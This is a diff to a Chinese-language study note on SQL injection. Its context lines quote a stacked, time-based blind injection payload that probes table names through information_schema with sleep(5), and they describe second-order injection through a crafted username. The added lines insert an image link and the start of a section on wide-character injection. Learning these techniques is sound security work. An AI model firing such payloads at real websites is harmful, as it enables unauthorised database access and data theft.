@@ -8,7 +8,7 @@
 
 
 1. 利用堆叠注入获取数据
-```
+```sql
 ';select if(substr((select table_name from information_schema.tables where table_schma=database() limit 0,1),1,1)='e',sleep(5),1)%23
 ```
 
@@ -19,4 +19,7 @@
 2. 注册的时候，用户名填写test`,这样子在查询用户的时候。就会报错。爆出一个数据库错误。
 
 所以二次注入攻击的完整过程是通过两次攻击一起整合到一次，从而绕过过滤。
+<img src="../pictures/y90dwbo69n.png" width="400" />
 
+## 宽字符注入
+>zheng'du
